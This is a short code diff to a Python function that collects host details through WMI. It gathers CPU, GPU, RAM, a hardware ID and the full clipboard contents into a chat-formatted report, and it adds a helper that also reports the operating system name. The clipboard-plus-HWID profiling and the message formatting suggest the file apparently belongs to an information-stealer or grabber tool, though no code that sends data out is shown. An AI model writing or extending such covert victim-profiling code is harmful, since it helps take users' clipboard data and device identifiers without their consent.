@@ -33,13 +33,23 @@ def system():
     if len(clipboard) > 1500:
         with open("clipboard.txt", "w", encoding="utf-8") as f: f.write(clipboard)
         clipboard = "Too long!"
+        
+    def get_os():
+        try:
+            wmi_obj = wmi.WMI()
+            os_info = wmi_obj.Win32_OperatingSystem()[0]
+            return os_info.Caption
+        except:
+            return "Unknown"
+    
+    os = get_os()
     
     cpu = wmi.WMI().Win32_Processor()[0].Name
     gpu = wmi.WMI().Win32_VideoController()[0].Name
     ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize
     ram = round(float(ram) / 1048576)
     
-    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nHWID: {hwid}\nClipboard: ```{clipboard}```"
+    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nHWID: {hwid}\nClipboard: ```{clipboard}```\nOS: {os}"
 
 
 def disk():
